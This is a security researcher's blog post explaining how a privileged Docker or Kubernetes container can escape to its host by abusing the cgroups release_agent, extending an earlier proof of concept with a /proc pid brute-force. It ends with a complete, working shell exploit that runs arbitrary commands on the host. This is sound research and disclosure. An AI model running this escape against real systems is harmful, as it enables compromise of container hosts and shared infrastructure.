---
source: alex-chapman
source_url: https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html
title: "Privileged Container Escape - Control Groups release_agent | Alex Chapman’s Blog"
published: 2020-11-19T00:00:00-06:00
description: "I’ve recently been doing a lot of bug hunting in containerized environments, and one common theme has been escaping a container to execute code on the container host. In this post I’ll expand on a technique reported by Felix Wilhelm (@_fel1x) to escape a privileged container to execute arbitrary commands on the container host."
---

I’ve recently been doing a lot of bug hunting in containerized environments, and one common theme has been escaping a container to execute code on the container host. In this post I’ll expand on a technique reported by [Felix Wilhelm (@_fel1x)](https://twitter.com/_fel1x) to escape a privileged container to execute arbitrary commands on the container host.

Privileged containers are often used in CI/CD pipelines to allow for building and publishing Docker images. Compromising a privileged container gets you one step closer to accessing the container host, but often will not let you easily execute commands directly on the host.

In July 2019 howerver, Felix Wilhelm posted a Tweet with a Proof of Concept to escape a privileged container by abusing the Control Groups `release_agent`

functionality to execute arbitrary commands on the container host:

Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature.

— Felix Wilhelm (@_fel1x)[pic.twitter.com/q8BI8ASBO8][July 17, 2019]

Trail of Bits have done good job of explaining the details of this PoC at [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/), they also detail the precise capabilities required for a container to execute this attack. A simple explanation is that the cgroups `release_agent`

functionality can be triggered from a privileged container to execute a path on the host file system, specified by the contents of the `release_agent`

file. The key is that the path specified in the `release_agent`

file has to be relative to the root file system of the container host, *not* a container.

Felix’s PoC identifies the host path of files within a container by parsing the container root mount point, and extracting the `upperdir`

mount option. To demonstrate this we can spin up a privileged Docker container and extract the host file system path of a file within the container:

Then within the container:

In this instance the container is configured to use `overlayfs`

, which exposes the host file system path of container mounts to the container itself. The host file system path here would be `/var/lib/docker/overlay2/826cfa3f5296e4643bab26e7d8e13885fff67636a403ffd9811486352c50e053/diff`


This can be confirmed by creating a file within a container:

And in another shell on the container host, using the `overlayfs`

mount path to `cat`

the file:

## Edge cases

This works fine when the container is configured with a storage-driver which exposes the full host path of the mount point, for example `overlayfs`

, however I recently came across a couple of configurations which did not obviously disclose the host file system mount point.

### Kata Containers*

[Kata Containers](https://katacontainers.io/) by default mounts the root fs of a container over `9pfs`

. This discloses no information about the location of the container file system in the Kata Containers Virtual Machine.

* More on Kata Containers in a future blog post.

### Device Mapper

I saw a container with this root mount in a live environment, I believe the container was running with a specific `devicemapper`

storage-driver configuration, but at this point I have been unable to replicate this behaviour in a test environment.

## An Alternative PoC

Obviously in these cases there is not enough information to identify the path of container files on the host file system, so Felix’s PoC cannot be used as is. However, we can still execute this attack with a little ingenuity.

The one key piece of information required is the full path, relative to the container host, of a file to execute within the container. Without being able to discern this from mount points within the container we have to look elsewhere.

### Proc to the Rescue

The Linux `/proc`

pseudo-filesystem exposes kernel process data structures for all processes running on a system, including those running in different namespaces, for example within a container. This can be shown by running a command in a container and accessing the `/proc`

directory of the process on the host:

*As an aside, the /proc/<pid>/root data structure is one that confused me for a very long time, I could never understand why having a symbolic link to / was useful, until I read the actual definition in the man pages:*


/proc/[pid]/root

UNIX and Linux support the idea of a per-process root of the filesystem, set by the chroot(2) system call. This file is a symbolic link that points to the process’s root directory, and behaves in the same way as exe, and fd/*.

Note however that this file is not merely a symbolic link. It provides the same view of the filesystem (including namespaces and the set of per-process mounts) as the process itself.


The `/proc/<pid>/root`

symbolic link can be used as a host relative path to any file within a container:

This changes the requirement for the attack from knowing the full path, relative to the container host, of a file within the container, to knowing the pid of *any* process running in the container.

### Pid Bashing

This is actually the easy part, process ids in Linux are numerical and assigned sequentially. The `init`

process is assigned process id `1`

and all subsequent processes are assigned incremental ids. To identify the host process id of a process within a container, a brute force incremental search can be used:

### Putting it All Together

To complete this attack the brute force technique can be used to guess the pid for the path `/proc/<pid>/root/payload.sh`

, with each iteration writing the guessed pid path to the cgroups `release_agent`

file, triggering the `release_agent`

, and seeing if an output file is created.

The only caveat with this technique is it is in no way shape or form subtle, and can increase the pid count very high. As no long running processes are kept running this *should* not cause reliability issues, but don’t quote me on that.

The below PoC implements these techniques to provide a more generic attack than first presented in Felix’s original PoC for escaping a privileged container using the cgroups `release_agent`

functionality:

```
#!/bin/sh
OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &
# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__
# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}
# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done
# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```


Executing the PoC within a privileged container should provide output similar to:

## Closing Thoughts

Thanks to [Felix Wilhelm](https://twitter.com/_fel1x) for publishing the initial PoC for this powerful privileged container escape technique.

For further details on the workings of cgroups `release_agent`

see [https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt).